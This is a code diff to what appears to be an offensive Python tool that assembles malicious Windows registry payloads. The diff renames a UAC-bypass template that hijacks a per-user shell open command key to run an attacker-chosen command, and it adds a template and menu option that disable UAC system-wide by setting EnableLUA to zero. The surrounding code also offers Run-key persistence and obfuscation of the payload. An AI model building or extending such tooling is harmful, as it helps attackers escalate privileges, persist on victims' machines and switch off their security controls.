@@ -26,10 +26,14 @@ template_spe = r"""
 "ReportingMode"=dword:00000001
 "MonitorProcess"="{1}"
 """
-template_uac = r"""
+template_bypass_uac = r"""
 [HKEY_CURRENT_USER\software\classes\{}\shell\open\command]
 "DelegateExecute"=""
 ""="{}"
+"""
+template_disable_uac = r"""
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System]
+"EnableLUA"=dword:00000000
 """
 
 
@@ -120,7 +124,7 @@ def add_uac_run():
         data_name = input(">> ")
         print(r"[>] Enter the command to execute (e.g. 'pOwErShElL -enc aQBlAHgAIA...')")
         command = sanitize_command(input(">> "))
-        payload += template_uac.format(reg_class, command)
+        payload += template_bypass_uac.format(reg_class, command)
         payload += template_run.format("HKEY_CURRENT_USER", run_key, data_name, uac_binary)
         print("[+] Added")
         return
@@ -156,8 +160,21 @@ def add_persistence():
 
 
 def mess_with_registry():
-    pass
-
+    global payload
+    while True:
+        print("[>] Choose:")
+        print("[1] Disable UAC")
+        print("[99] Back")
+        i = int(input(">> "))
+        if i == 1:
+            payload += template_disable_uac
+        elif i == 99:
+            return
+        else:
+            print("[-] No such option :(")
+            continue
+        print("[+] Added")
+        return
 
 def add_obfuscation(obf_length):
     global payload
